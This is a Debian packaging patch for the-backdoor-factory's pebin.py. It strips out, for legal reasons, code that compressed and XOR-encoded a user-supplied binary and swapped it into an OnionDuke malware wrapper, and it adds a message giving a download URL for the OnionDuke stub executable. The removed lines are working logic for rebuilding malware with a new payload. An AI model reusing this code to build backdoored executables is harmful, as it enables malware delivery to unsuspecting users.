@@ -32,7 +32,58 @@ Last-Update: 2017-06-01
  
 --- a/pebin.py
 +++ b/pebin.py
-@@ -1694,12 +1694,14 @@
+@@ -1487,41 +1487,17 @@
+             self.binary.seek(0x5C0, 0)
+             if self.binary.read(11) == "\x57\xE8\xE4\x10\x00\x00\x8B\x15\x2C\x20\x41":
+                 print "[!!!!] Attempting to Patch an OnionDuke wrapped binary"
+-                print "[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"
+-                compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
+-                subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])
+-                # key 0x1FE37D3E
+-                self.binary.seek(0x413, 0)
+-                xor_key1 = struct.unpack("<I", self.binary.read(4))[0]
+-
+-                self.binary.seek(0x429, 0)
+-                xor_key2 = struct.unpack("<I", self.binary.read(4))[0]
+-                if xor_key2 == xor_key1:
+-                    xorkey = xor_key1
+-                    print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
+-                    with open(compressedbin, 'r') as compressedBinary:
+-                        xorBinary = cStringIO.StringIO()
+-                        xor_file(compressedBinary, xorBinary, xorkey)
+-                    os.remove(compressedbin)
+-                else:
+-                    print "[*] Malformed OnionDuke Sample"
++                print "[!] Compressing", self.SUPPLIED_BINARY, "with aPLib is impossible due to Debian legal constraints"
++                print "[!] Aborting"
++                return False
++            else:
++                if not os.path.isfile(stubPath + "/OD_stub.exe"):
++                    print "[!] OD_stub.exe not found in " . stubPath
++                    print "  This file is not distributed with the Debian package because not delivered with sources"
++                    print "  You can download it here:"
++                    print "      https://github.com/secretsquirrel/the-backdoor-factory/raw/master/onionduke/OD_stub.exe"
+                     return False
+-                xorBinary.seek(0)
+-                #get size and location of OD malware
+-                self.binary.seek(0xfd3c, 0)
+-                self.od_begin_malware = struct.unpack("<I", self.binary.read(4))[0]
+-                self.binary.seek(0)
+-                print "[!] Removing original malware from binary."
+-                new_stub = self.binary.read(self.od_begin_malware)
+-                new_stub += xorBinary.read()
+-                od_stub.write(new_stub)
+-                self.od_end_malware = od_stub.tell()
+-                self.od_size_malware = xorBinary.tell()
+-                print "[*] Appending compressed user supplied binary after target binary"
+-                od_stub.seek(0xfd40, 0)
+-                od_stub.write(struct.pack("<I", self.od_size_malware))
+ 
+-            else:
+                 od_stub.write(open(stubPath + "/OD_stub.exe", 'r').read())
+                 #copy rsrc to memory
+                 self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
+@@ -1694,12 +1670,14 @@
  
          if self.INJECTOR is False:
              os_name = os.name
